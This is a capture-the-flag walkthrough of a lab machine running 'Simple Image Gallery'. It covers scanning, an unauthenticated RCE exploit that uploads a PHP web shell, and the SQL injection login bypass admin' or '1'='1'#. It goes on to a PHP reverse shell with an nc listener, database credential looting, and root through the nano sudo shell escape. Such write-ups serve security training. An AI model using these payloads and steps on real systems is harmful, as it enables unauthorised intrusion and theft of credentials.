@@ -1,0 +1,257 @@
+///Gallery///
+
+
+{{NMAP SCAN}}
+nmap -sV -T4 [machine IP]
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-14 13:10 EST
+Nmap scan report for 10.10.208.140
+Host is up (0.13s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+Going to http://[machine IP]:8080 shows us a "Simple Image Gallery System" Login page.
+
+{{GOBUSTER RESULTS}}
+
+(Make sure to specify which status codes to view, or else it will try and return every page as a 200 status code once you specify the -fw [force wildcard processing] argument.)
+
+gobuster -u http://[machine IP]:8080 -w dirbcommon.txt -t 250 -s 204,301,302,307,401,403
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.208.140:8080/
+[+] Threads      : 250
+[+] Wordlist     : dirbcommon.txt
+[+] Status codes : 204,301,302,307,401,403
+[+] Timeout      : 10s
+=====================================================
+2022/02/14 13:28:17 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/albums (Status: 301)
+/archives (Status: 301)
+/assets (Status: 301)
+/build (Status: 301)
+/classes (Status: 301)
+/database (Status: 301)
+/dist (Status: 301)
+/inc (Status: 301)
+/plugins (Status: 301)
+/report (Status: 301)
+/server-status (Status: 403)
+
+
+http://[machine IP]:8080/gallery/report reveals:
+
+Schedule Report
+Date Start
+Date End
+Room/Hall
+
+Unsure if this is anything so we will hang onto it for now. 
+Traversing the rest of the directories did not lead to anything, nor did trying to bruteforce the login page.
+
+We know the name of the CMS is "Simple Image Gallery", so let's see if we can find an exploit for that.
+
+https://www.exploit-db.com/exploits/50214
+
+Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)
+
+This looks promising. Download it and run:
+
+python3 50214.py 
+TARGET = 10.10.208.140/gallery/
+Login Bypass
+shell name TagokukmhsaivazznztLetta
+
+protecting user
+
+User ID : 1
+Firsname : Adminstrator
+Lasname : Admin
+Username : admin
+
+shell uploading
+- OK -
+Shell URL : http://10.10.208.140/gallery/uploads/1644866220_TagokukmhsaivazznztLetta.php?cmd=whoami
+
+I went to the URL and and tried out different commands, and tried various reverse shell one-liners to no avail. 
+
+However, within the RCE script there appears to be an SQLi that reads:
+admin' or '1'='1'#
+
+I plugged that into the login form and it works!
+
+We are presented with a welcome screen, as well as two tiles that say "Total Albums" and "Total Images".
+In the upper right corner, there is a dropdown that says "Administrator Admin", where we are able to choose a new avatar image.
+
+I used the usual pentestmonkey PHP reverse shell script, started a listener (nc -lvnp [port]) and clicked "Update".
+
+Catch the shell!
+User.txt is in /home/mike/, however we do not have sufficient permissions to view it just yet.
+
+First, I upgraded the shell:
+python3 -c "import pty;pty.spawn('/bin/bash')"
+Ctrl-Z
+stty raw -echo
+fg
+export TERM=xterm-256color
+
+There isn't much to investigate except for in /var/www/html/gallery. Eventually, I was able to find:
+
+cat initialize.php
+
+<?php
+$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
+
+if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
+if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
+if(!defined('dev_data')) define('dev_data',$dev_data);
+if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
+if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
+if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"[[xxx Real password is here xxx]]");
+if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
+?>
+
+This password for user dev_oretnom appears to not be the answer for question #3. I wasn't able to successfully use it anywhere, either. Instead, let's use the other credentials to login to the database:
+mysql -u gallery_user -p
+(enter password at prompt)
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| gallery_db         |
+| information_schema |
++--------------------+
+2 rows in set (0.01 sec)
+
+MariaDB [(none)]> use gallery_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [gallery_db]> show tables;
++----------------------+
+| Tables_in_gallery_db |
++----------------------+
+| album_list           |
+| images               |
+| system_info          |
+| users                |
++----------------------+
+4 rows in set (0.00 sec)
+
+MariaDB [gallery_db]> describe users;
++--------------+--------------+------+-----+-------------------+-----------------------------+
+| Field        | Type         | Null | Key | Default           | Extra                       |
++--------------+--------------+------+-----+-------------------+-----------------------------+
+| id           | int(50)      | NO   | PRI | NULL              | auto_increment              |
+| firstname    | varchar(250) | NO   |     | NULL              |                             |
+| lastname     | varchar(250) | NO   |     | NULL              |                             |
+| username     | text         | NO   |     | NULL              |                             |
+| password     | text         | NO   |     | NULL              |                             |
+| avatar       | text         | YES  |     | NULL              |                             |
+| last_login   | datetime     | YES  |     | NULL              |                             |
+| type         | tinyint(1)   | NO   |     | 0                 |                             |
+| date_added   | datetime     | NO   |     | CURRENT_TIMESTAMP |                             |
+| date_updated | datetime     | YES  |     | NULL              | on update CURRENT_TIMESTAMP |
++--------------+--------------+------+-----+-------------------+-----------------------------+
+10 rows in set (0.00 sec)
+
+MariaDB [gallery_db]> select * from users;
++----+--------------+----------+----------+----------------------------------+---------------------------------+------------+------+---------------------+---------------------+
+| id | firstname    | lastname | username | password                         | avatar                          | last_login | type | date_added          | date_updated        |
++----+--------------+----------+----------+----------------------------------+---------------------------------+------------+------+---------------------+---------------------+
+|  1 | Adminstrator | Admin    | admin    | [[xxx real hash is here xxx]]    | uploads/1644948120_phpshell.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-02-15 18:02:52 |
++----+--------------+----------+----------+----------------------------------+---------------------------------+------------+------+---------------------+---------------------+
+1 row in set (0.00 sec)
+
+MariaDB [gallery_db]> 
+
+There is the hash for question #3! I don't believe we need to crack it, as we've already logged in as that user and moved on, so for now let's just keep going.
+
+I found a backups folder in /var/, with a txt file of 3 different passwords in /mike_home_backup/. None of them appeared to work for logging in as mike, but if you cat out .bash_history,
+we can discover the real password:
+
+www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history
+cd ~
+ls
+ping 1.1.1.1
+cat /home/mike/user.txt
+cd /var/www/
+ls
+cd html
+ls -al
+cat index.html
+sudo -l[[xxx real password is here]]
+clear
+sudo -l
+exit
+
+(pressing the up arrow to view previous commands also works in revealing this)
+
+su mike
+(enter password at prompt)
+
+Now, grab the user flag in /home/mike/!
+
+{{PRIVILEGE ESCALATION}}
+
+ As usual, I tried to check sudo privileges first:
+ 
+ mike@gallery:~$ sudo -l
+Matching Defaults entries for mike on gallery:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mike may run the following commands on gallery:
+    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
+    
+Let's see what this is about:
+
+mike@gallery:/$ cat /opt/rootkit.sh
+#!/bin/bash
+
+read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;
+
+# Execute your choice
+case $ans in
+    versioncheck)
+        /usr/bin/rkhunter --versioncheck ;;
+    update)
+        /usr/bin/rkhunter --update;;
+    list)
+        /usr/bin/rkhunter --list;;
+    read)
+        /bin/nano /root/report.txt;;
+    *)
+        exit;;
+esac
+
+sudo /bin/bash /opt/rootkit.sh
+
+If we select the "read" option, we are dropped into nano.
+
+Since we can run this file as sudo, that means we should have executed nano as sudo as well. We can leverage this and obtain root.
+
+As per GTFO bins:
+
+Sudo
+
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+    sudo nano
+    ^R^X
+    reset; sh 1>&0 2>&0
+
+While in report.txt, first press CTRL-R, and then CTRL-X.
+It will ask you what command you would like to execute. Enter reset; sh 1>&0 2>&0
+
+Congratulations! Root flag is in /root/
